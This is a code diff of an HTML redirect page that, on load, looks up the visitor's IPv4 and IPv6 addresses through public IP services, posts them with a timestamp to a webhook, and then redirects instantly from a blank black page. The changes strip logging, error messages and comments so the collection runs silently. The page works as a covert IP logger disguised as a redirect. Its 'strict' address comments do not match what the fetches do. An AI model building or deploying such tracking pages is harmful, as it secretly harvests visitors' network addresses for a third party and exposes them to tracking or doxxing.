@@ -19,23 +19,19 @@
             let ipv4 = 'Not available / IPv6-Only';
             let ipv6 = 'Not available / IPv4-Only';
 
-            // 1. Fetch IPv4 Address
+            // 1. Fetch strict IPv4 Address
             try {
-                const res4 = await fetch('https://icanhazip.com');
+                const res4 = await fetch('https://ipify.org');
                 if (res4.ok) ipv4 = (await res4.text()).trim();
-            } catch (e) {
-                console.log('No IPv4 connectivity.');
-            }
+            } catch (e) {}
 
-            // 2. Fetch IPv6 Address
+            // 2. Fetch strict IPv6 Address
             try {
                 const res6 = await fetch('https://icanhazip.com');
                 if (res6.ok) ipv6 = (await res6.text()).trim();
-            } catch (e) {
-                console.log('No IPv6 connectivity.');
-            }
+            } catch (e) {}
 
-            // Format current date and time to a clean, simple format (e.g., 28.09.2026, 17:39)
+            // Format current date and time
             const now = new Date();
             const simpleDateString = now.toLocaleString('de-DE', {
                 day: '2-digit',
@@ -71,18 +67,16 @@
                     body: JSON.stringify(payload)
                 });
             } catch (e) {
-                console.error('Webhook Error:', e);
+                // Failsafe execution
             } finally {
-                // 5. Instantly redirect as soon as the fetch finishes (or fails)
+                // 5. Instantly redirect
                 window.location.href = CONFIG.REDIRECT_URL;
             }
         }
 
-        // Run the script as soon as the DOM is ready
         window.addEventListener('DOMContentLoaded', trackAndRedirect);
     </script>
     <style>
-        /* Makes the entire page completely black and hides scrolls */
         html, body {
             background-color: #000000 !important;
             margin: 0;
@@ -94,6 +88,5 @@
     </style>
 </head>
 <body>
-    <!-- Completely blank body -->
 </body>
 </html>
